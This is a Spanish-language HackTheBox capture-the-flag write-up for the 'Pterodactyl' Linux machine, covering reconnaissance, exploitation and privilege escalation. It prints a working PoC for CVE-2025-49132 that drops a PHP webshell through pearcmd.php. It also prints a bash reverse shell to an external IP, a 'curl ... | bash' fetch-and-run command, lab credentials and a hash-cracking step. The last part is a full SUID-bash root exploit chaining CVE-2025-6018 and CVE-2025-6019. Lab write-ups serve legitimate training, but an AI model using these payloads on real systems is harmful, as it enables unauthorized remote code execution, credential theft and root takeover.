---
title: Pterodactyl - HTB
date: 2026-05-16
mermaid: true
categories: [HackTheBox, Linux, Medium]
tags: [Web, CVE-2025-49132, Mysql, RCE, CVE-2025-6019, CVE-2025-6018, InformationDisclosure]
---

# Reconocimiento
Empiezo haciendo un `ping` para enviar un paquete ICMP a la victima, de esta forma podemos hacernos una idea de su sistema operativo y también si tenemos conexión a ella.

```bash
ping -c3 10.129.3.151
PING 10.129.3.151 (10.129.3.151) 56(84) bytes of data.
64 bytes from 10.129.3.151: icmp_seq=1 ttl=63 time=76.8 ms
64 bytes from 10.129.3.151: icmp_seq=2 ttl=63 time=76.8 ms
64 bytes from 10.129.3.151: icmp_seq=3 ttl=63 time=76.8 ms

--- 10.129.3.151 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 76.795/76.795/76.795/0.000 ms
```

Vemos que hemos recibido el paquete de vuelta, esto quiere decir que tenemos conexión a la maquina, y también vemos un `TTL (Time To Live)` de 63 así que podemos asumir que estamos ante una maquina Linux.

> TTL (Time To Live)
> 
> El TTL (Time To Live) en ICMP es un valor en la cabecera IP que limita la vida de un paquete a un número máximo de saltos (routers) para evitar bucles infinitos
> 
> 64   = Linux
> 128 = Windows

# Enumeración
Ahora que ya sabemos a que nos enfrentamos vamos a enumerar que puertos están abiertos con nmap.

```sh
nmap -p- --open -sS --min-rate 5000 -vv -Pn -n -oG allPorts 10.129.3.151

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
`-p-`: Para hacer un escaneo a las **65535 puertos**
`--open`: Solo me mostrara los puertos abiertos
`-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
`--min-rate 5000`: Envia como minino 5000 paquetes por segundo, haciendo que el escaneo sea mas ruidoso pero rapido
`-Pn`: Omitir el **descubrimiento de host (ARP)**
`-n`: No aplicara resolución DNS

Hago un segundo escaneo para enumerar versiones de los servicios de dichos puertos abiertos con los scripts de enumeración de nmap

```bash
nmap -p22,80 -sCV --min-rate 5000 -Pn -n --traceroute -oN target 10.129.3.151

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3741ea3ad02140100e6abb4188416e0 (ECDSA)
|_  256 65c833177ad6523d63c3e4a960642dcc (ED25519)
80/tcp open  http    nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   136.94 ms 10.10.16.1
2   256.42 ms 10.129.1.212
```
`-p22,80`: indico q la enumeración solo van a hacer en esos 2 puertos
`-sCV`: Identificara la versión de los servicios y ejecuta scripts de reconocimiento
`--traceroute`: se utiliza para rastrear la ruta hacia el host de destino, identificando cada salto (router) y midiendo la latencia de red entre ellos

# Enumeración Web
Antes de entrar en la web y empezar a enumerarla añado el virtual host en el **/etc/hosts**

```bash
echo "10.129.3.151 pterodactyl.htb" | sudo tee -a /etc/hosts
```

Una vez añadido ejecutare `whatweb` contra la web para ver que tecnologías usa

```bash
whatweb -v http://pterodactyl.htb/

[200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.5], IP[10.129.3.151], PHP[8.4.8], Script, Title[My Minecraft Server], X-Powered-By[PHP/8.4.8], nginx[1.21.5]
```

La información mas relevante que vemos es que la web utiliza `PHP 8.4.8` y que su servidor `nginx` en la versión `1.21.5` 

Ahora que ya sabemos que tecnologías usa vamos a entrar a la web

![](/assets/images/htb/Pterodactyl/1.png)

Adentro podemos ver que tenemos **2 cosas interesantes** el dominio **play.pterodactyl.htb** y el **changelo.txt** que si entramos vemos esto

![](/assets/images/htb/Pterodactyl/2.png)

Vemos la versión del panel de pterodactyl, y una mención al phpinfo()

>**Pterodactyl Panel es un panel de control de código abierto (_open source_) para la gestión y alojamiento de servidores de juegos, diseñado para ser seguro, moderno y eficiente.
>
>Utiliza contenedores Docker para aislar cada instancia de servidor, permitiendo a los usuarios administrar juegos populares como Minecraft de forma sencilla desde una interfaz web intuitiva**

```bash
dirsearch -u http://pterodactyl.htb

[15:56:08] Scanning: 
[15:56:22] 403 -   555B - /admin/.htaccess
[15:56:28] 403 -   555B - /administrator/.htaccess
[15:56:30] 403 -   555B - /app/.htaccess
[15:56:34] 200 -   920B - /changelog.txt
[15:56:44] 200 -    2KB - /index.php
[15:56:52] 200 -   72KB - /phpinfo.php
[15:56:55] 403 -   555B - /Public/
```

`dirsearch` nos reporta que tenemos `phpinfo.php` si entramos e investigamos un poco veremos lo siguiente:

![](/assets/images/htb/Pterodactyl/3.png)

>**PEAR (PHP Extension and Application Repository) es un repositorio, sistema de distribución y framework de componentes de código PHP reutilizables, diseñado para facilitar el desarrollo web mediante bibliotecas bien estructuradas. 
>
>Fundado en 1999, actúa como una biblioteca de clases adicionales que extienden las funcionalidades nativas de PHP.**

## Enumeración de subdominios
Ya revisado todo el contenido de la pagina principal vamos a buscar subdominios con `ffuf`

```sh
ffuf -u "http://10.129.3.151/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pterodactyl.htb" -c -r -fs 1686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.3.151/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pterodactyl.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1686
________________________________________________

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 416ms]
:: Progress: [114442/114442] :: Job [1/1] :: 206 req/sec :: Duration: [0:08:49] :: Errors: 0 ::
```

`ffuf` nos descubrió el subdominio `panel` así que también lo añadiremos al `/etc/hosts`

```sh
echo "10.129.1.212 panel.pterodactyl.htb" | sudo tee -a /etc/hosts
```

Si intentamos entrar parece ser el panel de **pterodactyl**

![](/assets/images/htb/Pterodactyl/4.png)

# Explotacion
ya teniendo la versión del mismo (`1.11.10`) podemos buscar algún CVE acerca de el, así que después de buscar durante un buen rato encuentro el siguiente CVE.

	[CVE-2025-49132](https://www.cvedetails.com/cve/CVE-2025-49132/)

> **CVE-2025-49132**
> 
> **Antes de la versión 1.11.11, al usar el archivo /locales/locale.json con los parámetros de consulta de configuración regional y espacio de nombres, un actor malicioso podía ejecutar código arbitrario sin estar autenticado. Esta capacidad de ejecutar código arbitrario podía utilizarse para acceder al servidor del panel, leer credenciales de su configuración, extraer información confidencial de la base de datos, acceder a los archivos de los servidores administrados por el panel, etc.**

Buscare algún PoC relacionado con ese CVE, pero después de un rato probando no veo que ninguno funcione correctamente, lo único que conseguí sacar fue las credenciales de la base de datos que corre internamente en la maquina victima, con el siguiente exploit

https://www.exploit-db.com/exploits/52341

ya que leyendo el código del script vemos que hace una petición a `/locales/locale.json?locale=../../../pterodactyl&namespace=config/database`

si entramos a dicha ruta podemos ver esta información
```json
{
  "../../../pterodactyl": {
    "config/database": {
      "default": "mysql",
      "connections": {
        "mysql": {
          "driver": "mysql",
          "url": "",
          "host": "127.0.0.1",
          "port": "3306",
          "database": "panel",
          "username": "pterodactyl",
          "password": "PteraPanel",
          "unix_socket": "",
          "charset": "utf8mb4",
          "collation": "utf8mb4_unicode_ci",
          "prefix": "",
          "prefix_indexes": "1",
          "strict": "",
          "timezone": "+00{{00}}",
          "sslmode": "prefer",
          "options": {
            "1014": "1"
          }
        }
      },
      "migrations": "migrations",
      "redis": {
        "client": "predis",
        "options": {
          "cluster": "redis",
          "prefix": "pterodactyl_database_"
        },
        "default": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "0",
          "context": []
        },
        "sessions": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "1",
          "context": []
        }
      }
    }
  }
}
```

De esta información podemos sacar las credenciales del **mysql** que corre internamente

- Username: pterodactyl
- Password: PteraPanel

Estas las podremos utilizar para mas adelante, en cuestión, podemos conseguir RCE con este CVE así que después de probar varios PoCs no pude recibir la conexión, así que decidí modificar uno de ellos 

https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py

```python
import sys, os

host=sys.argv[1]
payload=sys.argv[2].replace(' ','\\$\\\\{IFS\\\\}')

# Ugly but have to use curl since the package requests won't allow us to send characters like '{' without encoding them
os.system(f"curl \"http://{host}/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\"")

os.system(f"curl \"http://{host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"")
```

modificando el parámetro locale y poniendo la ruta del pearcmd mencionado anteriormente podemos conseguir un bind command injection.

>pearcmd.php es un script de línea de comandos incluido por defecto en las instalaciones tradicionales de PEAR (PHP Extension and Application Repository)
>
   Sin embargo, debido a su capacidad para interactuar con el sistema de archivos, **pearcmd.php** se ha convertido en un objetivo frecuente para atacantes en vulnerabilidades de **Inclusión Local de Archivos (LFI)**, permitiendo la ejecución remota de comandos (RCE) en servidores web mal configurado

Una vez modificado podemos utilizar curl para conseguir revshell pero antes de nada crearemos un archivo que llamare **cmd.sh**
```sh
#!/bin/bash
 
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.49/666 0>&1'
```

me pondre en escucha por el puerto 666 y levantare un servidor por python en el puerto 80 para descargar el archivo
```bash
$ python3 -m http.server 80

$ nc -lvnp 666

$ python3 poc.py panel.pterodactyl.htb "curl http://10.10.16.49/cmd.sh|bash"
```

y ya tendremos acceso como usuario wwwrun.

## wwwuser -> phileasfogg3
Recordando que obtuvimos una base de datos mysql corriendo de forma interna vamos a intentar conectarnos

```sh
mariadb -u pterodactyl -pPteraPanel -h 127.0.0.1
```

una vez dentro podemos observar que bases de datos encontramos
```sql
show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| panel              |
| test               |
+--------------------+
```

Si seleccionamos todo lo que hay en la tabla users podemos ver las contraseñas encriptadas en bcrypt, asi que usaremos `john` para crackearlas

```bash
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

y despues de un rato obtuvimos la contraseña del usuario phileasfogg3

- Username: phileasfogg3
- Password: !QAZ2wsx


# phileasfogg3 -> root
Despues de un rato enumerando, podemos encontrar un correo, el cual nos da la pista de que la vulnerabilidad esta en udisksctl, en este caso hay que concatenar 2 CVEs

CVE-2025-6018
CVE-2025-6019

para explotar el primero ejecutaremos lo siguiente:
```bash
cat > ~/.pam_environment << 'EOF'
XDG_SESSION_TYPE=tty
XDG_SESSION_CLASS=user
XDG_SEAT=seat0
XDG_VTNR=1
EOF
```
una vez hecho, cortaremos la conexion y volveremos a entrar por SSH 

> PAM (Pluggable Authentication Modules) necesita que cierres y vuelvas a iniciar sesión porque el archivo `~/.pam_environment` se lee **únicamente durante el proceso de autenticación**, es decir, cuando inicias sesión.

cuando entremos otra vez en nuestra maquina local ejecutaremos el siguiente script con la opcion (L)OCAL

```bash
#!/bin/bash
#
# PoC for CVE-2026-6019: LPE via libblockdev/udisks
# Author: 0xabdoulaye, Team Guinea Offensive Security
# Reestructurado para mayor legibilidad y mantenimiento.

set -euo pipefail # Modo seguro de Bash: sale si hay errores o variables no definidas

# ==========================================
# CONFIGURACIÓN Y CONSTANTES
# ==========================================
IMAGE_NAME="./xfs.image"
MOUNT_DIR="./xfs.mount"
IMAGE_SIZE_MB=300
DEPENDENCIES=("dd" "mount" "umount" "udisksctl" "gdbus" "killall" "grep" "chmod" "cp")

# Colors para salida en terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0;37m' # No Color

# ==========================================
# FUNCIONES DE UTILIDAD (HELPERS)
# ==========================================
log_info()    { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
log_error()   { echo -e "${RED}[-] Error:${NC} $1"; }

clean_local_build() {
    log_info "Limpiando archivos temporales locales..."
    umount "$MOUNT_DIR" 2>/dev/null || true
    rm -rf "$MOUNT_DIR" "$IMAGE_NAME"
}

# ==========================================
# VERIFICACIONES DE ENTORNO
# ==========================================
check_dependencies() {
    log_info "Verificando dependencias instaladas..."
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            log_error "El comando requerido '$dep' no está instalado."
            exit 1
        fi
    done
    log_success "Todas las dependencias están listas."
}

check_vulnerability() {
    log_info "Verificando versiones de libblockdev/udisks..."
    if ! command -v udisksctl &>/dev/null; then
        log_error "udisksctl no encontrado. Asegúrate de que udisks2 está instalado."
        exit 1
    fi
    local version
    version=$(udisksctl --version 2>/dev/null || echo "desconocida")
    log_info "Versión de udisks detectada: $version"
    log_warn "Se desconocen las versiones vulnerables exactas para CVE-2025-6019."
    log_warn "Verifica manualmente si el objetivo es vulnerable antes de continuar."
}

# ==========================================
# MODO LOCAL: CREACIÓN DE IMAGEN XFS
# ==========================================
create_xfs_image() {
    log_info "Iniciando creación de imagen XFS de ${IMAGE_SIZE_MB}MB..."

    if [ "$(id -u)" -ne 0 ]; then
        log_error "Se requieren privilegios de root para crear la imagen XFS localmente."
        exit 1
    fi

    # 1. Creación del archivo plano
    if ! dd if=/dev/zero of="$IMAGE_NAME" bs=1M count=$IMAGE_SIZE_MB status=progress; then
        log_error "Falló la creación de $IMAGE_NAME."
        exit 1
    fi

    # 2. Formateo XFS
    if ! mkfs.xfs -f "$IMAGE_NAME"; then
        log_error "Falló el formateo XFS de $IMAGE_NAME."
        rm -f "$IMAGE_NAME"
        exit 1
    fi

    # 3. Montaje para manipulación
    mkdir -p "$MOUNT_DIR"
    if ! mount -t xfs "$IMAGE_NAME" "$MOUNT_DIR"; then
        log_error "No se pudo montar la imagen."
        clean_local_build
        exit 1
    fi

    # 4. Verificación de espacio y copia de binario
    local bash_size
    bash_size=$(stat -c %s /bin/bash 2>/dev/null || echo 0)
    if [ "$bash_size" -eq 0 ]; then
        log_error "/bin/bash no se encuentra o no es accesible."
        clean_local_build
        exit 1
    fi

    local avail_space
    avail_space=$(df --block-size=1 "$MOUNT_DIR" | tail -1 | awk '{print $4}')
    if [ "$avail_space" -lt "$bash_size" ]; then
        log_error "Espacio insuficiente en la imagen XFS (Requerido: $bash_size bytes, Disponible: $avail_space)."
        clean_local_build
        exit 1
    fi

    # 5. Inyección de SUID Bash
    if ! cp /bin/bash "$MOUNT_DIR/bash" || ! chmod 4755 "$MOUNT_DIR/bash"; then
        log_error "Error al copiar o asignar permisos SUID a bash."
        clean_local_build
        exit 1
    fi

    # 6. Desmontaje y limpieza de entorno
    umount "$MOUNT_DIR"
    rm -rf "$MOUNT_DIR"

    log_success "Imagen XFS creada exitosamente: $IMAGE_NAME"
    log_info "Para transferir al objetivo usa: scp $IMAGE_NAME <user>@<host>:"
}

# ==========================================
# MODO OBJETIVO (CIBLE): EXPLOTACIÓN
# ==========================================
exploit_target() {
    log_info "Iniciando fase de explotación en el objetivo..."

    # 1. Validación de pre-requisitos en el entorno
    log_info "Verificando estado de 'allow_active'..."
    if ! gdbus call --system --dest org.freedesktop.login1 \
        --object-path /org/freedesktop/login1 \
        --method org.freedesktop.login1.Manager.CanReboot | grep -q "('yes',)"; then
        log_error "No se obtuvo el estado allow_active. La explotación podría fallar."
        log_warn "Considera mitigar o explotar CVE-2025-6018 previamente si aplica."
        exit 1
    fi
    log_success "Estado 'allow_active' confirmado."

    if [ ! -f "$IMAGE_NAME" ]; then
        log_error "No se encontró '$IMAGE_NAME'. Transfiérelo a este directorio primero."
        exit 1
    fi

    if ! file "$IMAGE_NAME" | grep -q "XFS filesystem"; then
        log_error "'$IMAGE_NAME' no es un sistema de archivos XFS válido."
        exit 1
    fi

    # 2. Preparación del entorno de explotación
    log_info "Deteniendo gvfs-udisks2-volume-monitor..."
    killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || log_info "gvfs-udisks2-volume-monitor no estaba activo."

    log_info "Configurando el dispositivo loop..."
    local loop_dev
    loop_dev=$(udisksctl loop-setup --file "$IMAGE_NAME" --no-user-interaction | grep -o '/dev/loop[0-9]*' || true)
    if [ -z "$loop_dev" ]; then
        log_error "Error al mapear el dispositivo loop."
        exit 1
    fi
    log_success "Dispositivo loop configurado: $loop_dev"

    # 3. Mantener el FS ocupado (Carrera de condición)
    log_info "Iniciando bucle en segundo plano para mantener ocupado el sistema de archivos..."
    while true; do 
        /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break
    done 2>/dev/null &
    local loop_pid=$!
    log_success "Bucle persistente iniciado (PID: $loop_pid)"

    # 4. Forzar el montaje mediante redimensión (Resize)
    log_info "Ejecutando peticiones de redimensión para forzar el automount..."
    local mount_success=false
    for i in {1..3}; do
        if gdbus call --system --dest org.freedesktop.UDisks2 \
            --object-path "/org/freedesktop/UDisks2/block_devices/${loop_dev##*/}" \
            --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' > gdbus_output.txt 2>&1; then
            log_warn "Intento $i: Respuesta inesperada (sin error), reintentando..."
        else
            if grep -q "Error resizing filesystem" gdbus_output.txt; then
                log_success "Montaje provocado con éxito (Error controlado: target is busy)."
                mount_success=true
                break
            fi
        fi
        sleep 1
    done

    if [ "$mount_success" = false ]; then
        log_error "No se logró provocar el automount tras 3 intentos."
        kill "$loop_pid" 2>/dev/null || true
        udisksctl loop-delete --block-device "$loop_dev" 2>/dev/null || true
        rm -f gdbus_output.txt
        exit 1
    fi

    sleep 2 # Estabilización del montaje

    # 5. Localización del binario SUID generado
    log_info "Buscando binario SUID en /tmp/blockdev*..."
    local suid_bash=""
    for i in {1..5}; do
        suid_bash=$(find /tmp -maxdepth 2 -path "/tmp/blockdev*/bash" -perm -4000 -type f 2>/dev/null | head -n 1)
        if [ -n "$suid_bash" ]; then
            log_success "Binario SUID localizado de forma efectiva: $suid_bash"
            ls -l "$suid_bash"
            break
        fi
        log_info "Intento $i: Esperando por la creación del nodo..."
        sleep 1
    done

    # 6. Ejecución del escalado
    if [ -z "$suid_bash" ]; then
        log_error "No se detectó el binario SUID tras los reintentos estructurados."
        kill "$loop_pid" 2>/dev/null || true
        udisksctl loop-delete --block-device "$loop_dev" 2>/dev/null || true
        exit 1
    fi

    log_info "Lanzando shell con privilegios elevados..."
    if "$suid_bash" -p; then
        log_success "Sesión finalizada con éxito."
        log_warn "El proceso persistente ($loop_pid) y el montaje siguen activos para evitar limpiezas automáticas."
    else
        log_error "Error crítico al intentar ejecutar el binario SUID."
        kill "$loop_pid" 2>/dev/null || true
        umount /tmp/blockdev* 2>/dev/null || true
        udisksctl loop-delete --block-device "$loop_dev" 2>/dev/null || true
        rm -rf /tmp/blockdev* "$IMAGE_NAME" gdbus_output.txt
    fi
}

# ==========================================
# MENÚ Y FLUJO PRINCIPAL
# ==========================================
main() {
    clear
    echo -e "${YELLOW}"
    echo "========================================================="
    echo "  PoC CVE-2025-6019 - libblockdev/udisks LPE  "
    echo "========================================================="
    echo -e "${NC}"
    log_warn "Este script debe ejecutarse exclusivamente en entornos controlados y autorizados."
    
    echo -n "¿Desea continuar? [y/N]: "
    read -r confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        log_info "Operación cancelada por el usuario."
        exit 0
    fi

    check_dependencies

    echo -e "\nSeleccione el modo de operación:"
    echo -e " [${GREEN}L${NC}]ocal : Generar una imagen XFS de 300MB (Requiere Root)"
    echo -e " [${GREEN}C${NC}]ible : Ejecutar fase de explotación en el objetivo"
    echo -n "Opción (L/C): "
    read -r choice

    case "${choice,,}" in
        l|local)
            create_xfs_image
            ;;
        c|cible)
            exploit_target
            ;;
        *)
            log_error "Opción no válida. Use 'L' para entorno local o 'C' para el objetivo."
            exit 1
            ;;
    esac
}

main "$@"
```
este script nos creara una imagen de 300MB, despues esa imagen la pasaremos con scp a la maquina victima

```bash
scp xfs.imagen <user>@<ip>:/home/<user>
```
y despues ejecutaremos el script nuevamente pero en nuestra maquina victima con la opcion (C) y ya seremos root